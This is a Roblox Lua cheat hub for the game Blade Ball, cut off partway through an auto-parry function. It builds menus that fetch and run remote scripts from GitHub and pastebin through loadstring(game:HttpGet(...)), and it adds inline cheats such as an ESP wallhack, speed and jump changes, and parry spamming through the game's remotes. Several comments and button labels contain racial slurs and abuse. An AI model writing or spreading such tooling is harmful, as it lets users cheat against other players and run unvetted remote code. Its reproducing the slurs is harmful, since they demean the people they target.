--╭━━━╮╱╱╱╱╱╱╱╭╮╱╱╭┳╮╱╭╮--
--┃╭━╮┃╱╱╱╱╱╱╱┃╰╮╭╯┃┃╱┃┃--
--┃┃╱╰╋━━┳━━┳━╋╮┃┃╭┫╰━╯┃--
--┃┃╭━┫┃━┫╭╮┃╭╯┃╰╯┃╰━━╮┃--
--┃╰┻━┃┃━┫╭╮┃┃╱╰╮╭╯╱╱╱┃┃--
--╰━━━┻━━┻╯╰┻╯╱╱╰╯╱╱╱╱╰╯--
-- Ui [Orion] Credits to the other Hubs
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Mobile%20Friendly%20Orion')))()
local Window = OrionLib:MakeWindow({Name = "GBLADE HUB Version (RW) [UNIVERSAL]", HidePremium = false, SaveConfig = true, IntroEnabled = true, IntroText="Version - RW"})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]



local Tab = Window:MakeTab({
	Name = "Blade Ball",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]



local Section = Tab:AddSection({
	Name = "Menu"
})

--[[
Name = <string> - The name of the section.
]]



OrionLib:MakeNotification({
	Name = "From Error | Bypasser Team",
	Content = "Join Error | Bypasser Server Now!!!",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]

Tab:AddButton({
	Name = "Circle Parry",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Circle-Parry/main/Circle%20parry"))()
      		print("button pressed")
  	end    
})

Tab:AddButton({
	Name = "X-Exploit By GearV4",
	Callback = function()
-- Made by GearV4
local loadingScreen = Instance.new("ScreenGui")
loadingScreen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0) -- Fill the entire screen which blocks your fucking screen
background.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background Cuz am racist
background.Parent = loadingScreen

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(0.5, 0, 0.2, 0) -- Size of the text box Inch hehe
loadingText.Position = UDim2.new(0.25, 0, 0.4, 0) -- Position of the text box idk
loadingText.BackgroundColor3 = Color3.new(1, 1, 1) -- White background Now am So Racist
loadingText.TextColor3 = Color3.new(0, 0, 0) -- Black text color So Racism
loadingText.TextSize = 24
loadingText.Font = Enum.Font.SourceSans
loadingText.Text = "Loading Assets"
loadingText.Parent = background

-- Function to add a dot to the loading text
local function addDot()
    loadingText.Text = loadingText.Text .. "."
end

-- Loop to simulate loading progress idk again
for i = 1, 100 do
    if i % 3 == 0 then
        addDot()
    end
    loadingText.Text = "Loading Assets: " .. i .. "%"
    wait(0.1) -- Adjust the wait time as needed
end

-- Display "Script successfully loaded" message yea so they will know nigga
loadingText.Text = "Script successfully loaded"

-- Destroy loading screen after loading is complete yea lime how i fuck yo mom
wait(2) -- Wait for 2 seconds before destroying you Mf
loadingScreen:Destroy()
-- AM FUCKED IDK WHAT SCRIPT WILL I DO?

local lib = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local Window = lib.CreateLib("X-Exploit [Blade Ball]", "DarkTheme")
local MainSection = Window:NewTab("Blade Ball")
local MainSection = MainSection:NewSection("Made By GearV4")

MainSection:NewSlider("Walkspeed", "Changes how fast you walk.", 250, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
    end)

    MainSection:NewSlider("JumpPower", "Changes how fast you jump.", 250, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
    end)
    
 MainSection:NewButton("Circle Parry", "It Can Parry But it has A Circle Thingy", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Circle-Parry/main/Circle%20parry"))()
 end)
 
 MainSection:NewButton("ZapHub", "Gives you a hub for blade credits tk zapteam", function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/UPD-Blade-Ball-ZapHub-The-Best-BB-Script-Working-12073"))()
 end)
 
 MainSection:NewToggle("Infinite Jump", "Lets you infinitely jump", function()
        local InfiniteJumpEnabled = true
        game:GetService("UserInputService").JumpRequest:connect(function()
            if InfiniteJumpEnabled then
                game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
            end
        end)
    end)
 
 MainSection:NewButton("WL Hub", "Gives you a hub for blade credits to WL Team", function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/Blade-Ball-WL-Hub-made-by-vien-11240"))()
 end)
 
MainSection:NewButton("Bedol Hub", "Gives you a hub for blade credits to Bedol Owner", function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/UPD-Blade-Ball-Bedol-Hub-9041"))()
 end) 
 
 MainSection:NewButton("Fly", "Makes You Fly and Hard to Target", function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Fly-Gui-Modded-10763"))()
 end)
 
 MainSection:NewButton("x7 parry", "Also a Parry But has like A Big Globe on ya", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Code4Zaaa/X7Project/main/Game/AutoParryOnly"))()
 end)
 
 MainSection:NewButton("FFJ1", "made by fsploit my friend", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
 end)
 
MainSection:NewButton("YsacXy Hub", "Just a Hub Nigger", function()
        loadstring(game:HttpGet(('https://pastebin.com/raw/Hqr4NnFU'),true))()
end)

MainSection:NewButton("Auto Spam", "It Spams Nigger", function()
        loadstring(game:HttpGet('https://pastebin.com/raw/KB4xQe4j'))()
end)

MainSection:NewButton("FPS", "Makes your game look Shit but makes game no lag", function()
        local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
 end)
 
 MainSection:NewButton("ESP", "See People on walls or maybe more", function()
        --// Universal Box ESP (Works on Arsenal and other games)

-- settings
local settings = {
   defaultcolor = Color3.fromRGB(255,0,0),
   teamcheck = false,
   teamcolor = true
};

-- services
local runService = game:GetService("RunService");
local players = game:GetService("Players");

-- variables
local localPlayer = players.LocalPlayer;
local camera = workspace.CurrentCamera;

-- functions
local newVector2, newColor3, newDrawing = Vector2.new, Color3.new, Drawing.new;
local tan, rad = math.tan, math.rad;
local round = function(...) local a = {}; for i,v in next, table.pack(...) do a[i] = math.round(v); end return unpack(a); end;
local wtvp = function(...) local a, b = camera.WorldToViewportPoint(camera, ...) return newVector2(a.X, a.Y), b, a.Z end;

local espCache = {};
local function createEsp(player)
   local drawings = {};
   
   drawings.box = newDrawing("Square");
   drawings.box.Thickness = 1;
   drawings.box.Filled = false;
   drawings.box.Color = settings.defaultcolor;
   drawings.box.Visible = false;
   drawings.box.ZIndex = 2;

   drawings.boxoutline = newDrawing("Square");
   drawings.boxoutline.Thickness = 3;
   drawings.boxoutline.Filled = false;
   drawings.boxoutline.Color = newColor3();
   drawings.boxoutline.Visible = false;
   drawings.boxoutline.ZIndex = 1;

   espCache[player] = drawings;
end

local function removeEsp(player)
   if rawget(espCache, player) then
       for _, drawing in next, espCache[player] do
           drawing:Remove();
       end
       espCache[player] = nil;
   end
end

local function updateEsp(player, esp)
   local character = player and player.Character;
   if character then
       local cframe = character:GetModelCFrame();
       local position, visible, depth = wtvp(cframe.Position);
       esp.box.Visible = visible;
       esp.boxoutline.Visible = visible;

       if cframe and visible then
           local scaleFactor = 1 / (depth * tan(rad(camera.FieldOfView / 2)) * 2) * 1000;
           local width, height = round(4 * scaleFactor, 5 * scaleFactor);
           local x, y = round(position.X, position.Y);

           esp.box.Size = newVector2(width, height);
           esp.box.Position = newVector2(round(x - width / 2, y - height / 2));
           esp.box.Color = settings.teamcolor and player.TeamColor.Color or settings.defaultcolor;

           esp.boxoutline.Size = esp.box.Size;
           esp.boxoutline.Position = esp.box.Position;
       end
   else
       esp.box.Visible = false;
       esp.boxoutline.Visible = false;
   end
end

-- main
for _, player in next, players:GetPlayers() do
   if player ~= localPlayer then
       createEsp(player);
   end
end

players.PlayerAdded:Connect(function(player)
   createEsp(player);
end);

players.PlayerRemoving:Connect(function(player)
   removeEsp(player);
end)

runService:BindToRenderStep("esp", Enum.RenderPriority.Camera.Value, function()
   for player, drawings in next, espCache do
       if settings.teamcheck and player.Team == localPlayer.Team then
           continue;
       end

       if drawings and player ~= localPlayer then
           updateEsp(player, drawings);
       end
   end
end)
 end)
 
 MainSection:NewButton("ExploitX Hub", "Made By Fsploit", function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/k00pz/Fsploit-boredom/main/Mainly-Fsploit-Exploit-X%20better%20hacks%20better%20days%2012%2019%2010'))()
 end)
 
 MainSection:NewButton("Wizard X", "Blade Ballz Script Made By GearV4", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zYs2yHX5", true))()
:Notify("Wizard X","Script will load successfully in 10 sec pls wait",10)
--10=Duration of notification
local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()

local PhantomForcesWindow = Library:NewWindow("Wizard X [God]")

local Bladeball = PhantomForcesWindow:NewSection("BladeBall MainTab v2")

Bladeball:CreateToggle("Auto Parry ", function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Parry",true))()
  end)

Bladeball:CreateToggle("Auto Spam V1 (Credits=JoeHub)", function()loadstring(game:HttpGet("https://raw.githubusercontent.com/DonGabrielle/AutoDetectV4/main/MainBalls"))()
end)

Bladeball:CreateButton("Auto Spam V2", function()loadstring(game:HttpGet("https://pastebin.com/raw/t2391h1A"))()
end)

Bladeball:CreateToggle("AutoDetectV1", function ()loadstring(game:HttpGet(('https://pastebin.com/raw/HPNBFGSf'),true))()
end)

Bladeball:CreateButton("ToggleBlockSpam:By Hosvile", function()game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Script by Hosvile",
    Text = "Hold Block button to Spam",
    Duration = 5
})

getgenv().SpamSpeed = 25 -- 1-25

if not getgenv().exeSpam then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/Toggle%20Block%20Spam",true))()
end

getgenv().exeSpam = true
  end)

Bladeball:CreateButton("Fps Booster", function()_G.Settings = {
    Players = {
        ["Ignore Me"] = true, -- Ignore your Character
        ["Ignore Others"] = true-- Ignore other Characters
    },
    Meshes = {
        Destroy = false, -- Destroy Meshes
        LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
    },
    Images = {
        Invisible = true, -- Invisible Images
        LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
        Destroy = false, -- Destroy Images
    },
    ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
    ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
    ["No Explosions"] = true, -- Makes Explosion's invisible
    ["No Clothes"] = true, -- Removes Clothing from the game
    ["Low Water Graphics"] = true, -- Removes Water Quality
    ["No Shadows"] = true, -- Remove Shadows
    ["Low Rendering"] = true, -- Lower Rendering
    ["Low Quality Parts"] = true -- Lower quality parts
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
  end)

Bladeball:CreateToggle("Destroy Particle", function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/Destroy%20Particle%20Emitters",true))()
  end)

Bladeball:CreateButton("HoldToSpam:By Hosvile",
function()getgenv().SpamSpeed = 9
loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Spam",true))()
  end) 

Bladeball:CreateToggle("Aiming Mechanism", 
function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/M%3ABlade%20Ball%20Mechanism",true))()
  end)
  
BladeBall:CreateToggle("Auto Clash", 
function()loadstring(game:HttpGet("https://pastebin.com/raw/t2391h1A"))()
 end)
 end)
 
 MainSection:NewButton("Manual Parry", "It Can Parry The Ballz Made by Fsploit", function()
        function Manual()
local toggleState = false
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.Name = "Button"

local button = Instance.new("TextButton")
button.Text = "Manual Parry"
button.BackgroundTransparency = 0
button.BackgroundColor3 = Color3.new(1, 1, 1)
button.Size = UDim2.new(0, 150, 0, 70)
button.Parent = ScreenGui
button.Position = UDim2.new(0, 100, 0, 100)

local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 15)
topBar.BackgroundColor3 = Color3.new(0, 0, 0)
topBar.Parent = button

local originalColor = button.BackgroundColor3
local grayColor = Color3.new(0.7, 0.7, 0.7)

local dragging = false
local offset = Vector2.new()
local player = game.Players.LocalPlayer

topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        offset = button.Position - UDim2.new(0, input.Position.X, 0, input.Position.Y)
        button.BackgroundColor3 = grayColor
    end
end)

topBar.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local inputPosition = input.Position
        local newPosition = UDim2.new(0, inputPosition.X, 0, inputPosition.Y) + offset
        button.Position = newPosition
    end
end)

topBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
        button.BackgroundColor3 = originalColor
    end
end)

button.MouseButton1Click:Connect(function()
    toggleState = not toggleState
    button.Text = tostring(toggleState)
    getgenv().Spam = toggleState
    while getgenv().Spam do
game.ReplicatedStorage.Remotes.ParryButtonPress:Fire()
        wait(0.01)
    end
end)

ScreenGui.Parent = player:FindFirstChild("PlayerGui")
end
 end)
  
  MainSection:NewButton("Just Blade Ball", "Has Parry,Anti lag and 1 more", function()
       -- Create ScreenGui object and set its properties
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.Enabled = true
screenGui.ResetOnSpawn = false -- Prevents the GUI from resetting when the player respawns

-- Create ImageLabel object to display the title
local titleLabel = Instance.new("ImageLabel")
titleLabel.Size = UDim2.new(0, 200, 0, 50)
titleLabel.Position = UDim2.new(0.5, -100, 0, 10)
titleLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background color
titleLabel.BorderSizePixel = 0 -- Remove border
titleLabel.ImageTransparency = 0 -- Make the text visible
titleLabel.Image = "rbxassetid://6996358407" -- Use an image with the text "ROVA HUB 1.V"
titleLabel.Parent = screenGui

-- Create ScrollingFrame object
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(0, 200, 0, 200)
scrollingFrame.Position = UDim2.new(0.5, -100, 0.5, -100)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background color
scrollingFrame.BorderSizePixel = 0 -- Remove border
scrollingFrame.CanvasSize = UDim2.new(0, 0, 1, 0) -- Enable vertical scrolling
scrollingFrame.Parent = screenGui

-- Create ImageLabel object inside the ScrollingFrame object
local avatarImageLabel = Instance.new("ImageLabel")
avatarImageLabel.Size = UDim2.new(0, 50, 0, 50)
avatarImageLabel.Position = UDim2.new(0, 10, 0, 10) -- Add some padding
avatarImageLabel.Image = "http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&userid="..game.Players.LocalPlayer.UserId
avatarImageLabel.Parent = scrollingFrame

-- Create button inside the ScrollingFrame object
local autoParryButton = Instance.new("TextButton")
autoParryButton.Size = UDim2.new(0, 150, 0, 50) -- Increase width
autoParryButton.Position = UDim2.new(0.5, -75, 0, 80) -- Center horizontally, move down
autoParryButton.BackgroundColor3 = Color3.fromRGB(0, 123, 255) -- Blue background color
autoParryButton.TextColor3 = Color3.new(1, 1, 1)
autoParryButton.Text = "Auto Parry V2"
autoParryButton.Font = Enum.Font.SourceSansBold -- Change font
autoParryButton.TextSize = 24 -- Increase font size
autoParryButton.Parent = scrollingFrame

-- Create Open/Close button in the top right corner of the screen
local openCloseButton = Instance.new("TextButton")
openCloseButton.Size = UDim2.new(0, 100, 0, 50)
openCloseButton.Position = UDim2.new(1, -110, 0, 10)
openCloseButton.BackgroundColor3 = Color3.fromRGB(0, 123, 255) -- Blue background color
openCloseButton.TextColor3 = Color3.new(1, 1, 1)
openCloseButton.Text = "Open/Close"
openCloseButton.Font = Enum.Font.SourceSansBold -- Change font
openCloseButton.TextSize = 18 -- Decrease font size
openCloseButton.Parent = screenGui

-- Create PointLight object and set its properties
local light = Instance.new("PointLight")
light.Brightness = 5
light.Range = 20
light.Color = Color3.fromRGB(255, 255, 255)
light.Parent = screenGui

-- Define a function to animate the ScrollingFrame's position and transparency
local function animateScrollingFrame(scrollingFrame, titleLabel, isVisible)
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    if isVisible then
        scrollingFrame.Visible = true
        local tween = game:GetService("TweenService"):Create(scrollingFrame, tweenInfo, {Position = UDim2.new(0.5, -100, 0.5, -100), BackgroundTransparency = 0})
        tween:Play()
        local titleTween = game:GetService("TweenService"):Create(titleLabel, tweenInfo, {Position = UDim2.new(0.5, -100, 0, 10), ImageTransparency = 0})
        titleTween:Play()
    else
        local tween = game:GetService("TweenService"):Create(scrollingFrame, tweenInfo, {Position = UDim2.new(0.5, -100, 1.5, -100), BackgroundTransparency = 1})
        tween:Play()
        local titleTween = game:GetService("TweenService"):Create(titleLabel, tweenInfo, {Position = UDim2.new(0.5, -100, -0.5, -10), ImageTransparency = 1})
        titleTween:Play()
        wait(0.5)
        scrollingFrame.Visible = false
    end
end

-- Connect the animateScrollingFrame function to the Open/Close button's MouseButton1Click event
openCloseButton.MouseButton1Click:Connect(function()
    animateScrollingFrame(scrollingFrame, titleLabel, not scrollingFrame.Visible)
end)

-- Define a function to execute the auto parry 
local function executeScript()
    animateScrollingFrame(scrollingFrame, titleLabel, true)
    getgenv().SpamSpeed = 1
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Spam",true))()
    autoParryButton.Text = "Auto Parry (work+hosvile)"
end

autoParryButton.MouseButton1Click:Connect(executeScript)


-- Define a function to execute the auto parry 
local function executeScript()
    animateScrollingFrame(scrollingFrame, titleLabel, true)
   getgenv().config = getgenv().config or {
 hit_time = 0.3, -- // recommended 0.25 to 0.75 \\ --
 
 mode = 'Always', -- // Hold , Toggle , Always \\ --
 deflect_type = 'Remote', -- // Key Press , Remote \\ --
 notifications = true,
 keybind = Enum.KeyCode.V
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Parry%20V4.0.0",true))()
    autoParryButton.Text = "Auto Parry (work+hosvile)"
end

autoParryButton.MouseButton1Click:Connect(executeScript)


-- Create Antilag button inside the ScrollingFrame object
local antilagButton = Instance.new("TextButton")
antilagButton.Size = UDim2.new(0, 150, 0, 50) -- Increase width
antilagButton.Position = UDim2.new(0.5, -75, 0, 140) -- Center horizontally, move down
antilagButton.BackgroundColor3 = Color3.fromRGB(0, 123, 255) -- Blue background color
antilagButton.TextColor3 = Color3.new(1, 1, 1)
antilagButton.Text = "Antilag"
antilagButton.Font = Enum.Font.SourceSansBold -- Change font
antilagButton.TextSize = 24 -- Increase font size
antilagButton.Parent = scrollingFrame

-- Define a function to execute the antilag script 
local function executeAntilagScript()
local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
end

antilagButton.MouseButton1Click:Connect(executeAntilagScript)

-- Create Hold to Spam button inside the ScrollingFrame object
local holdToSpamButton = Instance.new("TextButton")
holdToSpamButton.Size = UDim2.new(0, 150, 0, 50) -- Increase width
holdToSpamButton.Position = UDim2.new(0.5, -75, 0, 200) -- Center horizontally, move down
holdToSpamButton.BackgroundColor3 = Color3.fromRGB(0, 123, 255) -- Blue background color
holdToSpamButton.TextColor3 = Color3.new(1, 1, 1)
holdToSpamButton.Text = "Hold to Spam"
holdToSpamButton.Font = Enum.Font.SourceSansBold -- Change font
holdToSpamButton.TextSize = 24 -- Increase font size
holdToSpamButton.Parent = scrollingFrame

-- Define a function to execute the spam script when the button is held down
local function holdToSpam()
    getgenv().SpamSpeed = 1 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Spam",true))()
end

-- Connect the holdToSpam and stopSpam functions to the MouseButton1Down and MouseButton1Up events of the TextButton object
holdToSpamButton.MouseButton1Down:Connect(holdToSpam)
holdToSpamButton.MouseButton1Up:Connect(stopSpam)

-- Define the function to execute the script
local function executeScript()
    getgenv().SpamSpeed = 1
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Spam",true))()
end

-- Connect the function to the Humanoid.Died event
game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        character:WaitForChild("Humanoid").Died:Connect(function()
            executeScript()
        end)
    end)
end)

-- Create TextLabel object inside the ScrollingFrame object to display player's name

local playerNameLabel = Instance.new("TextLabel")
playerNameLabel.Size = UDim2.new(0, 100, 0, 20)
playerNameLabel.Position = UDim2.new(0, 70, 0, 10) -- Add some padding
playerNameLabel.Text = game.Players.LocalPlayer.Name
playerNameLabel.TextColor3 = Color3.new(1, 1, 1)
playerNameLabel.Font = Enum.Font.SourceSansBold -- Change font
playerNameLabel.TextSize = 28 -- Increase font size
playerNameLabel.Parent = scrollingFrame 
    end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ScreenGui"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local Toggle = Instance.new("TextButton")
Toggle.Name = "GUI by GearV4"
Toggle.Parent = ScreenGui
Toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
Toggle.Size = UDim2.new(0, 90, 0, 38)
Toggle.Font = Enum.Font.SourceSans
Toggle.Text = "By GearV4"
Toggle.TextColor3 = Color3.fromRGB(248, 248, 248)
Toggle.TextSize = 28.000
Toggle.Draggable = true
Toggle.MouseButton1Click:connect(function()
    Library:ToggleUI()
end)

local Corner = Instance.new("UICorner")
Corner.Name = "Corner"
Corner.Parent = Toggle

game.StarterGui:SetCore("SendNotification", {Title = "X-Exploit", Text = "X-Exploit loaded successfully!", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
      		print("button pressed")
  	end    
})

Tab:AddButton({
	Name = "Exploit X Blade Ball",
	Callback = function()
	local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Exploit X | Version 2.9.1",
    SubTitle = "Blade Ball",
    TabWidth = 160,
    Size = UDim2.fromOffset(500, 250),
    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Aqua",
    MinimizeKey = Enum.KeyCode.RightControl -- Used when theres no MinimizeKeybind
})

local Tabs = {
    Main = Window:AddTab({ Title = "Parry", Icon = "shield" }),
    Misc = Window:AddTab({ Title = "Misc", Icon = "component" }),
    Credits = Window:AddTab({ Title = "Credits", Icon = "copyright" })
}

local Options = Fluent.Options

--functions
function Manual()
local toggleState = false
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.Name = "Button"

local button = Instance.new("TextButton")
button.Text = "Manual Parry"
button.BackgroundTransparency = 0
button.BackgroundColor3 = Color3.new(1, 1, 1)
button.Size = UDim2.new(0, 150, 0, 70)
button.Parent = ScreenGui
button.Position = UDim2.new(0, 100, 0, 100)

local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 15)
topBar.BackgroundColor3 = Color3.new(0, 0, 0)
topBar.Parent = button

local originalColor = button.BackgroundColor3
local grayColor = Color3.new(0.7, 0.7, 0.7)

local dragging = false
local offset = Vector2.new()
local player = game.Players.LocalPlayer

topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        offset = button.Position - UDim2.new(0, input.Position.X, 0, input.Position.Y)
        button.BackgroundColor3 = grayColor
    end
end)

topBar.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local inputPosition = input.Position
        local newPosition = UDim2.new(0, inputPosition.X, 0, inputPosition.Y) + offset
        button.Position = newPosition
    end
end)

topBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
        button.BackgroundColor3 = originalColor
    end
end)

button.MouseButton1Click:Connect(function()
    toggleState = not toggleState
    button.Text = tostring(toggleState)
    getgenv().Spam = toggleState
    while getgenv().Spam do
game.ReplicatedStorage.Remotes.ParryButtonPress:Fire()
        wait(0.01)
    end
end)

ScreenGui.Parent = player:FindFirstChild("PlayerGui")
end

function autoParry()
local Debug = false -- Set this to true if you want my debug output.
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local Player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local Remotes = ReplicatedStorage:WaitForChild("Remotes", 9e9) -- A second argument in waitforchild what could it mean?
local Balls = workspace:WaitForChild("Balls", 9e9)
local function print(...) -- Debug print.
    if Debug then
        warn(...)
    end
end
local function VerifyBall(Ball) -- Returns nil if the ball isn't a valid projectile; true if it's the right ball.
    if typeof(Ball) == "Instance" and Ball:IsA("BasePart") and Ball:IsDescendantOf(Balls) and Ball:GetAttribute("realBall") == true then
        return true
    end
end
local function IsTarget() -- Returns true if we are the current target.
    return (Player.Character and Player.Character:FindFirstChild("Highlight"))
end
local function Parry() -- Parries.
    Remotes:WaitForChild("ParryButtonPress"):Fire()
end
Balls.ChildAdded:Connect(function(Ball)
    if not VerifyBall(Ball) then
        return
    end
    print(`Ball Spawned: {Ball}`)
